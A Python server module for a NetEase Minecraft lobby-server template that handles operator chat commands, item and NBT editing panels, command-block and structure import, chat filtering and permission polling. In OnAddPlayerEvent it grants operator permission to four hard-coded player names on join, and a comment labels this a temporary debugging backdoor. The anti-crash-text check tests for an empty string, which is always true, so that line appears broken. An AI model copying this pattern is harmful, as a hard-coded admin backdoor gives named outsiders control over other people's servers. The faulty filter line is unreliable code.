# -*- coding: utf-8 -*-
from __future__ import print_function
from Preset.Model.PartBase import PartBase
from Preset.Model.GameObject import registerGenericClass
import mod.server.extraServerApi as serverApi
import mod.client.extraClientApi as clientApi
import json

CFServer = serverApi.GetEngineCompFactory()
CFClient = clientApi.GetEngineCompFactory()
levelId = serverApi.GetLevelId()
compCmd = CFServer.CreateCommand(levelId)
compGame = CFServer.CreateGame(levelId)

def unicode_convert(input):
	#type: (dict|str) -> dict|list|str|bool
	if isinstance(input, dict):
		return {unicode_convert(key): unicode_convert(value) for key, value in input.iteritems()}
	elif isinstance(input, list):
		return [unicode_convert(element) for element in input]
	elif isinstance(input, unicode): # type: ignore
		output = input.encode('utf-8')
		if output == 'True':
			return True
		elif output == 'False':
			return False
		else:
			return output
	else:
		return input

def conver_to_nbt(input):
	#if isinstance(input, str):
	#	return {'__type__':8, '__value__':input}
	if isinstance(input, list):
		return [conver_to_nbt(element) for element in input]
	#elif input in [0, 1]:
	#	return {'__type__':1, '__value__':input}
	#elif isinstance(input, int):
	#	return {'__type__':3, '__value__':input}
	#elif isinstance(input, float):
	#	return {'__type__':5, '__value__':input}
	elif isinstance(input, dict):
		if input.has_key('__type__'):
			if input['__type__'] == 4: 
				return {'__type__':4, '__value__': (input['__value__'])}
			return input
		else:
			return {key: conver_to_nbt(value) for key, value in input.iteritems()}

def intg(num):
	return int(num)-1 if num < 0 else int(num)

@registerGenericClass("MainLogicPart")
class MainLogicPart(PartBase):
	
	def __init__(self):
		PartBase.__init__(self)
		# 零件名称
		self.name = "主逻辑零件"
		self.etsFiles = []
		self.last_operation_cache = {}  # 缓存操作员状态

	def InitClient(self):
		"""
		@description 客户端的零件对象初始化入口
		"""
		PartBase.InitClient(self)
		clientsystem = clientApi.GetSystem("Minecraft", "preset")
		clientsystem.ListenForEvent("Minecraft", "preset", "openUI", self, self.UI)
		clientsystem.ListenForEvent('Minecraft', 'preset', 'close', self, self.close)
		clientsystem.ListenForEvent(clientApi.GetEngineNamespace(), clientApi.GetEngineSystemName(),'OnLocalPlayerStopLoading', self, self.OnFinish)

	def OnFinish(self, args):
		clientApi.GetSystem("Minecraft", "preset").NotifyToServer('TryOpenEULA', {})

	def TryOpenEULA(self, args):
		serversystem = serverApi.GetSystem("Minecraft", "preset")
		compExtra = CFServer.CreateExtraData(args['__id__'])
		if not compExtra.GetExtraData('EULA'):
			serversystem.NotifyToClient(args['__id__'], 'openUI', {"ui": "EULA"})

	def UI(self, args):
		uiNodePreset = self.GetParent().GetChildPresetsByName(args["ui"])[0]
		uiNodePreset.SetUiActive(True)
		uiNodePreset.SetUiVisible(True)
		
	def close(self, args):
		for i in ["enchant","getitem","nbteditor","itemTips","cmdbatch","cmdblockimportui","struimport"]:
			uiNodePreset = self.GetParent().GetChildPresetsByName(i)[0]
			uiNodePreset.SetUiActive(False)
			uiNodePreset.SetUiVisible(False)

	def enchant(self, enchantdata):
		if CFServer.CreatePlayer(enchantdata["__id__"]).GetPlayerOperation() == 2:
			# 二次权限验证
			compItem = CFServer.CreateItem(enchantdata["__id__"])
			itemDict = compItem.GetPlayerItem(2, 0, True)
			if itemDict:
				if itemDict["userData"] is None:
					itemDict["userData"] = {}
				if itemDict["userData"].get('ench', None) is None:
					itemDict["userData"]['ench'] = []
				if enchantdata["id"] == "del":
					itemDict["userData"]['ench'].pop(0)
				else:
					itemDict["userData"]['ench'].insert(0, {'lvl': {'__type__': 2, '__value__': int(enchantdata["lvl"])}, 'id': {'__type__': 2, '__value__': int(enchantdata["id"])}, 'modEnchant': {'__type__': 8, '__value__': ''}})
				itemDict["enchantData"] = []
				compItem.SpawnItemToPlayerCarried(itemDict, enchantdata["__id__"])

	def getitem(self, itemdata):
		if CFServer.CreatePlayer(itemdata["__id__"]).GetPlayerOperation() == 2:
			CFServer.CreateItem(itemdata["__id__"]).SpawnItemToPlayerInv(itemdata, itemdata["__id__"])

	def loadstructure(self, data):
		playerid = data["__id__"]
		if CFServer.CreatePlayer(playerid).GetPlayerOperation() == 2:
			playerpos = CFServer.CreatePos(playerid).GetFootPos()
			player_X, player_Y, player_Z = playerpos
			player_X = intg(player_X)
			player_Y = int(player_Y)
			player_Z = intg(player_Z)
			structure = unicode_convert(json.loads(data["structuredata"]))
			block_palette = structure['structure']['palette']['default']['block_palette']
			block_entity_data = conver_to_nbt(structure['structure']['palette']['default']['block_position_data'])
			serversystem = serverApi.GetSystem("Minecraft", "preset")
			blockEntitycomp = CFServer.CreateBlockInfo(levelId)
			blockcomp = CFServer.CreateBlockInfo(levelId)
			blockStateComp = CFServer.CreateBlockState(levelId)
			i = 0
			for x in range(structure["size"][0]):
				for y in range(structure['size'][1]):
					for z in range(structure['size'][2]):
						if structure['structure']['block_indices'][0][i] != -1:
							blockcomp.SetBlockNew((player_X+x, player_Y+y,player_Z+z),
							 					{'name':block_palette[structure['structure']['block_indices'][0][i]]['name'], 
			  									'aux':0}, 
												0, 
												data['dimension'], 
												True, 
												False)
							blockStateComp.SetBlockStates((player_X+x, player_Y+y,player_Z+z),block_palette[structure['structure']['block_indices'][0][i]]['states'], data['dimension'])
							if block_entity_data.has_key(str(i)) and block_entity_data[str(i)].has_key('block_entity_data'):
								print(block_entity_data[str(i)]['block_entity_data'])
								blockEntitycomp.SetBlockEntityData(data['dimension'], (player_X+x, player_Y+y,player_Z+z), (block_entity_data[str(i)]['block_entity_data']))
							pass
						i += 1
			for i in structure['structure']['entities']:
				x, y, z = i['Pos']
				x = x['__value__']
				y = y['__value__']
				z = z['__value__']
				x -= structure['structure_world_origin'][0]
				y -= structure['structure_world_origin'][1]
				z -= structure['structure_world_origin'][2]
				x += player_X
				y += player_Y
				z += player_Z
				print((x, y, z))
				print(serversystem.CreateEngineEntityByNBT(i, (x, y, z), None, data['dimension']))


	def InitServer(self):
		serversystem = serverApi.GetSystem("Minecraft", "preset")
		
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "ServerChatEvent", self, self.OnServerChat)
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "CommandEvent", self, self.OnCommandEvent)
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "PlayerJoinMessageEvent", self, self.OnAddPlayerEvent)
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "PlayerLeftMessageServerEvent", self, self.OnRemovePlayerEvent)
		serversystem.ListenForEvent(serverApi.GetEngineNamespace(), serverApi.GetEngineSystemName(), "ClientLoadAddonsFinishServerEvent", self, self.OnClientLoadAddonsFinishServerEvent)
		serversystem.ListenForEvent('Minecraft', 'preset', "enchant", self, self.enchant)
		serversystem.ListenForEvent('Minecraft', 'preset', "getitem", self, self.getitem)
		serversystem.ListenForEvent('Minecraft', 'preset', "changeTip", self, self.changeTips)
		serversystem.ListenForEvent('Minecraft', 'preset', "changenbt", self, self.changenbt)
		serversystem.ListenForEvent('Minecraft', 'preset', 'cmdbatch', self, self.cmdbatch)
		serversystem.ListenForEvent('Minecraft', 'preset', 'cmdblockimport', self, self.cmdblockimport)
		serversystem.ListenForEvent('Minecraft', 'preset', 'loadstructure', self, self.loadstructure)
		serversystem.ListenForEvent('Minecraft', 'preset', 'TryOpenEULA', self, self.TryOpenEULA)
		serversystem.ListenForEvent('Minecraft', 'preset', 'EULA', self, self.eula)
		compCmd.SetCommandPermissionLevel(4)
		self.timer = CFServer.CreateGame(serverApi.GetLevelId).AddRepeatedTimer(1.0, self.OnSecond)

		"""
		@description 服务端的零件对象初始化入口
		"""

		PartBase.InitServer(self)

	def eula(self, args):
		if args["reason"] == "您没有接受EULA协议":
			compCmd.SetCommand('/kick %s %s' % (CFServer.CreateName(args['__id__']).GetName(), args["reason"]), False)
		else:
			CFServer.CreateExtraData(args['__id__']).SetExtraData('EULA', True)

	def changenbt(self, args):
		if CFServer.CreatePlayer(args["__id__"]).GetPlayerOperation() == 2:
			CFServer.CreateItem(args["__id__"]).SpawnItemToPlayerCarried(args["nbt"], args["__id__"])
	
	def cmdbatch(self, cmds):
		playerid = cmds["__id__"]
		cmd = cmds["cmds"]
		if CFServer.CreatePlayer(playerid).GetPlayerOperation() == 2:
			cmd = cmd.split("\n")
			playername = CFServer.CreateName(playerid).GetName()
			for i in cmd:
				compCmd.SetCommand('/execute as "'+ playername +'" at @s run ' + i, True)
		
	def changeTips(self, tips):
		if CFServer.CreatePlayer(tips["__id__"]).GetPlayerOperation() == 2:
			itemComp = CFServer.CreateItem(tips["__id__"])
			itemDict = itemComp.GetEntityItem(2, 0, True)
			if tips["Tips"] == '':
				del itemDict['userData']['ItemCustomTips']
			itemDict['customTips'] = tips["Tips"]
			itemComp.SpawnItemToPlayerCarried(itemDict, tips["__id__"])

	def cmdblockimport(self, cmdblockcmdsjson):
		playerid = cmdblockcmdsjson["__id__"]
		if CFServer.CreatePlayer(playerid).GetPlayerOperation() == 2:
			playerpos = CFServer.CreatePos(playerid).GetFootPos()
			player_X, player_Y, player_Z = playerpos
			data = json.loads(cmdblockcmdsjson["cmdblockcmdsjson"])
			blockEntitycomp = serverApi.GetEngineCompFactory().CreateBlockInfo(levelId)
			for block in data:
				
				cmd = block["Command"].encode("utf-8")
				name = block["CustomName"].encode("utf-8")
				x = int(block["x"] + intg(player_X))
				y = int(block["y"] + int(player_Y))
				z = int(block["z"] + intg(player_Z))
				delay = int(block["Delay"])
				print("delay:", delay)
				dimensionId = cmdblockcmdsjson["dimension"]
				redstone_mode_mapping = {0: 1, 1: 0}
				redstoneMode = redstone_mode_mapping.get(block["isAuto"], None)
				compBlockEntity = CFServer.CreateBlockEntity(levelId)
				cmdblkdata = compBlockEntity.GetCommandBlock((x, y, z), dimensionId)
				mode = int(cmdblkdata["mode"])
				isConditional = int(cmdblkdata["isConditional"])
				
				# 设置命令方块的延迟，通过网易接口设置后返回True，但实际上并没有设置成功

				# blockEntityData = blockEntitycomp.GetBlockEntityData(dimensionId, (x,y,z))
				# if blockEntityData:
				# 	blockEntityData['TickDelay']['__value__'] = delay
				# 	blockEntitycomp.SetBlockEntityData(dimensionId, (x,y,z), blockEntityData)
				
				compBlockEntity.SetCommandBlock((x, y, z), dimensionId, cmd, name, mode, isConditional, redstoneMode)
		
	def OnServerChat(self, args):
		playerId = args["playerId"]
		serversystem = serverApi.GetSystem("Minecraft", "preset")
		compMsg = CFServer.CreateMsg(playerId)
		can_use_key = 0
		if CFServer.CreatePlayer(playerId).GetPlayerOperation() == 2:
			can_use_key = 1
		if args["message"] == "python.enchant":
			args["cancel"] = True
			if can_use_key == 1:
				compCmd.SetCommand('/tellraw @a[tag=op,name=!%s] {"rawtext":[{"text":"§7§o[%s: 打开了自定义附魔面板]"}]}' % (args["username"], args["username"]))
				serversystem.NotifyToClient(playerId, "openUI", {"ui":"enchant"})
			else:
				compMsg.NotifyOneMessage(playerId, "你没有使用此命令的权限", "§c")
		elif args["message"] == "python.getitem":
			args["cancel"] = True
			if can_use_key == 1:
				compCmd.SetCommand('/tellraw @a[tag=op,name=!%s] {"rawtext":[{"text":"§7§o[%s: 打开了获取隐藏物品面板]"}]}' % (args["username"], args["username"]))
				serversystem.NotifyToClient(playerId, "openUI", {"ui":"getitem"})
			else:
				compMsg.NotifyOneMessage(playerId, "你没有使用此命令的权限", "§c")
		elif args["message"] == "python.nbteditor":
			args["cancel"] = True
			if can_use_key == 1:
				compCmd.SetCommand('/tellraw @a[tag=op,name=!%s] {"rawtext":[{"text":"§7§o[%s: 打开了NBT修改器]"}]}' % (args["username"], args["username"]))
				serversystem.NotifyToClient(playerId, "openUI", {"ui":"nbteditor"})
			else:
				compMsg.NotifyOneMessage(playerId, "你没有使用此命令的权限", "§c")
		elif args["message"] == "python.changetips":
			args["cancel"] = True
			if can_use_key == 1:
				compCmd.SetCommand('/tellraw @a[tag=op,name=!%s] {"rawtext":[{"text":"§7§o[%s: 打开了修改物品注释面板]"}]}' % (args["username"], args["username"]))
				serversystem.NotifyToClient(playerId, "openUI", {"ui":"itemTips"})
			else:
				compMsg.NotifyOneMessage(playerId, "你没有使用此命令的权限", "§c")
		elif args["message"] == "python.cmdbatch":
			args["cancel"] = True
			if can_use_key == 1:
				compCmd.SetCommand('/tellraw @a[tag=op,name=!%s] {"rawtext":[{"text":"§7§o[%s: 打开了批量执行命令面板]"}]}' % (args["username"], args["username"]))
				serversystem.NotifyToClient(playerId, "openUI", {"ui":"cmdbatch"})
			else:
				compMsg.NotifyOneMessage(playerId, "你没有使用此命令的权限", "§c")
		elif args["message"] == "python.cmdblockimport":
			args["cancel"] = True
			if can_use_key == 1:
				compCmd.SetCommand('/tellraw @a[tag=op,name=!%s] {"rawtext":[{"text":"§7§o[%s: 打开了命令方块设置工具面板]"}]}' % (args["username"], args["username"]))
				serversystem.NotifyToClient(playerId, "openUI", {"ui":"cmdblockimportui"})
			else:
				compMsg.NotifyOneMessage(playerId, "你没有使用此命令的权限", "§c")
		elif args["message"] == "python.structureimport":
			args["cancel"] = True
			if can_use_key == 1:
				compCmd.SetCommand('/tellraw @a[tag=op,name=!%s] {"rawtext":[{"text":"§7§o[%s: 打开了导入结构面板]"}]}' % (args["username"], args["username"]))
				serversystem.NotifyToClient(playerId, "openUI", {"ui":"struimport"})
			else:
				compMsg.NotifyOneMessage(playerId, "你没有使用此命令的权限", "§c")
		elif args["message"] == "python.getversion":
			args["cancel"] = True
			compMsg.NotifyOneMessage(playerId, "---------\n版本： v0.8(2025/6):1\n© 2025 联机大厅服务器模板\n本项目采用 GNU General Public License v3.0 许可证。\n---------", "§b")
		elif args["message"] == "python.gettps":
			args["cancel"] = True
			if can_use_key == 1:
				if serverApi.GetServerTickTime() <= 50:
					TPS = "20.0*"
				else:
					TPS = "%.1f" % (1000/serverApi.GetServerTickTime())
				compMsg.NotifyOneMessage(playerId, "TPS:%s mspt:%.2fms" % (TPS,serverApi.GetServerTickTime()) , "§e")
			else:
				compMsg.NotifyOneMessage(playerId, "你没有使用此命令的权限。", "§c")
		elif "" in args["message"] or "" in args["message"] or "" in args["message"]:
			args["cancel"] = True
			compMsg.NotifyOneMessage(playerId, "§6§l反崩服系统>>> §r§c检测到您试图发送崩服文本，系统已将您禁言！请联系房间管理解除禁言")
			compCmd.SetCommand('/tellraw @a[tag=op] {\"rawtext\":[{\"text\":\"§6§l管理小助手>>> §r§e检测到玩家§c【%s】§r§e试图发送崩服文本，系统已将其禁言。若需解除禁言，请使用§a/ability§e命令\"}]}' % (args["username"]))
			compCmd.SetCommand('/ability %s mute true' % (args["username"]), False)
		else:
			args["cancel"] = True
			message = args["message"]
			compdata = CFServer.CreateExtraData(playerId)
			if compdata.GetExtraData("chatprefix"):
				chatprefix = compdata.GetExtraData("chatprefix")
			else:
				chatprefix = ""
			if not compGame.CheckWordsValid(message):
				message = "***"

			compGame.SetNotifyMsg("%s%s >>> %s" % (chatprefix, args["username"], message))
			# 注意：使用setnotifymsg会被视为系统消息而非玩家消息，无法使用“静音玩家聊天”屏蔽

			# 旧版，使用tellraw，遇到引号会报错
			# message = message.replace('\\', '\\\\')
			# compCmd.SetCommand('/tellraw @a {\"rawtext\":[{\"text\":\"%s%s >>> §r%s\"}]}' % (chatprefix, args['username'], message.replace('"', '\\"')))

	def OnCommandEvent(self, args):
		compMsg = CFServer.CreateMsg(args["entityId"])
		if args["command"] == "/kill @e":
			args["cancel"] = True
			compMsg.NotifyOneMessage(args["entityId"], '命令 /kill @e 已在本地图被禁止。', "§c")

	def OnAddPlayerEvent(self, args):
		if args["name"] == "王培衡很丁丁":
			args["message"] = "§b§l[开发者] §r§e王培衡很丁丁 加入了游戏"
			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
		elif args["name"] == "EGGYLAN_":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN_ 加入了游戏"
			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
		elif args["name"] == "EGGYLAN":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN 加入了游戏"
			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
		elif args["name"] == "渡鸦哥与陌生人":
			CFServer.CreatePlayer(args["id"]).SetPermissionLevel(2)
		# 临时后门，仅用于调试

	def OnClientLoadAddonsFinishServerEvent(self, args):
		playername = CFServer.CreateName(args["playerId"]).GetName()
		
		# 禁用魔法指令功能
		CFServer.CreateAiCommand(args["playerId"]).Disable()
		
		if not compGame.CheckWordsValid(playername):
			CFServer.CreatePlayer(args["playerId"]).SetPermissionLevel(0)
			CFServer.CreateMsg(args["playerId"]).NotifyOneMessage(args["playerId"], "§6§l管理小助手>>> §r§c检测到您的名字中含有违禁词，已将您设为游客权限。")
			compCmd.SetCommand('/tellraw @a {"rawtext":[{"text":"§6§l房间公告>>> §r§e检测到名字含有违禁词的玩家加入了游戏，已将其设为游客权限!"}]}',False)
			compCmd.SetCommand('/tellraw @a[tag=op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§b可使用§a@a[tag=banname]§b选中违禁词玩家!"}]}',False)
			CFServer.CreateTag(args["playerId"]).AddEntityTag("banname")
	
	def OnRemovePlayerEvent(self, args):
		if args["name"] == "王培衡很丁丁":
			args["message"] = "§b§l[开发者] §r§e王培衡很丁丁 离开了游戏"
		elif args["name"] == "EGGYLAN_":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN_ 离开了游戏"
		elif args["name"] == "EGGYLAN":
			args["message"] = "§b§l[开发者] §r§eEGGYLAN 离开了游戏"

	def TickClient(self):
		"""
		@description 客户端的零件对象逻辑驱动入口
		"""
		PartBase.TickClient(self)

	def TickServer(self):
		"""
		@description 服务端的零件对象逻辑驱动入口
		"""
		PartBase.TickServer(self)

	def OnSecond(self):
		# 轮询性能消耗较大，但我们不得不使用，因为网易并未给出权限事件触发的接口
		# 目前的做法是每秒轮询一次，获取所有玩家的权限，并设置权限
		playerIds = serverApi.GetPlayerList()
		for player in playerIds:

			current_op = CFServer.CreatePlayer(player).GetPlayerOperation()
			
			# 旧 master 指令现已弃用，玩家需改用命令方块内/console "/op"命令设置权限
			# if CFServer.CreateExtraData(player).GetExtraData("isMaster"):
			# 	CFServer.CreatePlayer(player).SetPermissionLevel(2)		
			
			if (self.last_operation_cache.get(player) != current_op):
				
				playername = CFServer.CreateName(player).GetName()

				if current_op == 2:
					compCmd.SetCommand('/tellraw @a[name=%s,tag=!op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§a您已获得管理员权限。"}]}' % (playername))
					CFServer.CreateTag(player).AddEntityTag("op")
				else:
					compCmd.SetCommand('/tellraw @a[name=%s,tag=op] {"rawtext":[{"text":"§6§l管理小助手>>> §r§c您的管理员权限已被撤销。"}]}' % (playername))
					CFServer.CreateTag(player).RemoveEntityTag("op")
				
				self.last_operation_cache[player] = current_op # 更新缓存

	def DestroyClient(self):
		"""
		@description 客户端的零件对象销毁逻辑入口
		"""
		clientsystem = clientApi.GetSystem("Minecraft", "preset")
		clientsystem.UnListenAllEvents()
		PartBase.DestroyClient(self)

	def DestroyServer(self):
		"""
		@description 服务端的零件对象销毁逻辑入口
		"""
		CFServer.CreateGame(serverApi.GetLevelId).CancelTimer(self.timer)
		serversystem = serverApi.GetSystem("Minecraft", "preset")
		serversystem.UnListenAllEvents()
		PartBase.DestroyServer(self)